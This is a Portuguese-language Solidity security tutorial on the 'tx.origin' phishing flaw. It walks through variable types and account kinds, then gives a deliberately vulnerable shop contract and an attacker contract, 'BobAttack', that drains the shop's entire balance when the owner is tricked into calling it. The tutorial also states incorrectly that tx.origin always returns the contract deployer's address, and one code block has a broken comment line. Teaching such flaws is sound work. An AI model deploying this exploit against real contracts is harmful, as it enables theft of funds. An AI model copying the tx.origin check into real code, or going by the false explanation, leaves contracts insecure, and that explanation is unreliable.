# Vulnerabilidade Em Um Smart Contract |`tx.origin`

---

<p align="center">
  <img src="/assets/image-doc.png"
    alt="screenshot" width="100%">
</p>

---

## Introdução

Essa é uma falha de segurança que envolve uma variável **global do solidity**. Para uma melhor explanação dessa vulnerabilidade começaremos com uma descrição básica sobre os tipos de vaiáveis que a linguagem **solidity** suporta. Essas variáveis são as seguintes:

- Variáveis de estado(State variables)
- Variáveis de locais(Local variables)
- Variáveis globais(Global variables)

### Variáveis de estado(State variables)

São variáveis cujos valores são armazenados permanentemente em um contrato.

```javascript
// SPDX-License-Identifier: MIT (web3dev)
pragma solidity ^0.8.16;
contract Statevariable {
   uint storedData;  //variável de estado
   constructor() {
      storedData = 10;  // atribuindo um valor
   }

   function returnStoredData()public view returns (uint) {
     return storedData;
   }
}
```

Caso queira testar o código anterior use o [IDE Remix](https://remix.ethereum.org/), assim poderá interagir com o contrato. Em suma, quando a função `returnStoredData` for executada, você receberá o seguinte dado:

```bash
{
	"0": "uint256: 10"
}
```

Em outras palavras a variável foi **gravada** no contrato e pode ser acessada toda vez que a função `returnStoredData` for executada.

### Variáveis locais(Local variables)

Variáveis cujos valores são usados apenas dentro do bloco de código da função. Os parâmetros são sempre locais para a função.

```javascript

// SPDX-License-Identifier: MIT (web3dev)
pragma solidity ^0.8.16;
contract SolidityTest {
   function getResult() public pure returns(uint){
      uint a = 1; // variável local
      uint b = 2;
      uint result = a + b;
      return result; //acessando a variável local
   }
}

```

### Variáveis globais(Global variables)

Na documentação da linguagem solidity existe uma seção dedicada a listar as **funções e variáveis especiais**, das quais não listarei todas abaixo, porém você pode conferir em [Special Variables and Functions](https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html?highlight=global%20variables#special-variables-and-functions).

| Nome                                            |                                                                             Retorno |
| :---------------------------------------------- | ----------------------------------------------------------------------------------: |
| `blockhash(uint blockNumber) returns (bytes32)` | Hash of the given block - only works for 256 most recent, excluding current, blocks |
| `block.coinbase (address payable)`              |                                                       Current block miner's address |
| `block.difficulty (uint)`                       |                                                            Current block difficulty |
| -                                               |                                                                                   - |
| **`msg.sender`**                                |                                            sender of the **message** (current call) |
| **`tx.origin`**                                 |                                     sender of the **transaction** (full call chain) |

Direto ao ponto, as variáveis globais fornecem informações do blockchain e as propriedades das transações.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract GlobalVariables {
    function globalVariables() public view returns(uint, address, address,uint) {
        uint timestamp = block.timestamp;
        address sender = msg.sender;
        address senderx= tx.origin;
        uint blockdifficulty= block.difficulty;
        return(timestamp, sender, senderx,blockdifficulty);
    }
}
```

Focando no em nosso caso de estudo, se você executar o código anterior verá que que tanto `msg.sender` quanto`tx.origin` fornecem a mesma saída, ou seja, o endereço da carteira de quem chamou a transação. Porém, o próprio site oficial da linguagem solidity levanta uma **bandeira vermelha** para o uso da função `tx.origin`:

> Nunca use tx.origin para autorizar uma transação.

Fonte: [Solidity docs](https://docs.soliditylang.org/en/v0.8.17/security-considerations.html?highlight=tx.origin#tx-origin)

A resposta para o que realmente acontece por debaixo dos panos quando executamos o contrato é mais simples do que aparenta, veja a seguir:

- A variável `tx.origin` independente de quantas vezes o contrato for executado por diferentes contas, quando a variável for invocada nós sempre vamos obter como saída o endereço **EOA** de quem implantou o contrato.

- Já a variável `msg.sender` nos retorna o endereço da conta de quem chamou(executou) a última transação. E nesse caso não precisa ser necessariamente uma conta do tipo **EOA** pode ser uma **SCA**. Em resumo, se um usuário interagir com o contrato **A** e concretizar uma transação, quando a função `msg.sender` for executada nós teremos como saída o último endereço que interagiu com o contrato o mesmo é valido para uma conta **SCA**.

#### `tx.origin` vs `msg.sender`

Enquanto `tx.origin` precorre toda a pilha de contratos para retornar o endereço **EOA** de quem implantou o contrato, `msg.sender` retorna dois tipos de contas **EOA** e **SCA** e nesse caso a saída vai depender de quem interagiu com a conta por último.

###EOA e SCA 🤔
Para explicar as variáveis anteriormente acabei citando dois termos que eu não havia introduzido antes, no caso **EOA** e **SCA**. Direto ao ponto, na rede Ethereum existem dois tipos de contas, que são as citadas anteriormente.

Explicando cada uma:

- **EOA** (Externally Owned Account) é o tipo de conta é controlado por uma **chave pública** e uma **chave privada**, ou seja, a conta que o usuário comum pode criar utilizando uma Crypto Wallet, como por exemplo a **MetaMask**.

> Nesse caso o usuário que possui a acesso a **chave pública** e uma **chave privada**, controla o saldo e todas as interações com a blockchain, outra característica é que uma **EOA** existe fora da **EVM**, por isso o **Externally**.

- **SCA** (Smart Contract Account) esse tipo de conta é regido por **código**, em outras palavras **código é lei**, assim toda interação com esse tipo de conta é regida por regras pré-estabelecidas no momento em que o contrato foi criado.

### Quando é que começaremos a hackear? 😂

![Alt text](/assets/funny_meme.png)

Acredito que a introdução base para entender o nosso caso de estudo já foram fornecidas anteriormente então vamos lá.

Ao usar a variável global `tx.origin` para autorização de transações em um contrato inteligente, fará com que ele fique vulnerável a ataques de **phishing**. Então vamos para o nosso exemplo:

Considere o seguinte contrato para a loja da **Alice**: a vítima:

```javascript
/ SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;
contract LojaAlice {
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    function Comprar() public payable {}

    function transfer(address _to, uint256 amount) public {
        require(tx.origin == owner, "Not owner");
        (bool success, ) = _to.call{value: amount}("");
        require(success, "Failed to send ether");
    }

    function getBalance()public view returns (uint256) {
        return address(this).balance;
    }
}
```

É um contrato bem simples apenas para o nosso caso de estudo, pois veja que na função comprar não está definido um **preço** para ser executa, ou seja, para executa-la o cliente precisa inserir um valor em ETH, mais precisamente, em **wei**.

> Nota: 1 ETH = $1\times10^{18}wei$

![Alt text](/assets/transfer.png)

A função `transfer` ela pode ser executada apenas pela **Alice**, que para ser executada precisa ser fornecido dois "valores":

- `address`: o endereço da conta **EOA** ou **SCA** para o qual **Alice** deseja enviar o saldo que ela possui no contrato da loja.

- `amount`: o valor que a dona do contrato deseja enviar.

Já a função `getBalance` quando for executada nos retorna o **saldo** associado ao contrato inteligente em **wei**.
Exemplo:
![Alt text](/assets/getbalance.png)

Nesse caso o contrato possui um total de 10 ETH= $1\times10^{19}wei$

### Agora partindo para o contrato malicioso

Um usuário que vamos chamar de **Bob** percebeu a vulnerabilidade no contrato da **Alice**, criou o seguinte contrato:

```javascript
contract BobAttack {
    address public owner;
    LojaAlice store;

    constructor(LojaAlice _store) {
        store = LojaAlice(_store);
        owner = msg.sender;
    }

    function attack() public {
        store.transfer(owner, address(store).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

Perceba que um dos parâmetros para implantação do contrato do **Bob** é o endereço do contrato da loja da **Alice** onde ele referencia apenas como `store`.

![Alt text](/assets/bob_deploy.png)

Depois de implantado o contrato malicioso do **Bob**, ele precisa que a **Alice** execute a função `attack`, mas para que o ataque seja bem sucedido, a vítima precisa autorizar a transação usando a mesma conta **EOA** usada na implantação do contrato inteligente do loja. Dessa forma, caso o critério estabelecido por **Bob** seja satisfeito, a vítima nesse caso a **Alice**, irá autorizar que todos os fundos do contrato da loja transferidos para a conta **EOA** do **Bob**, concretizando assim o ataque de phishing.
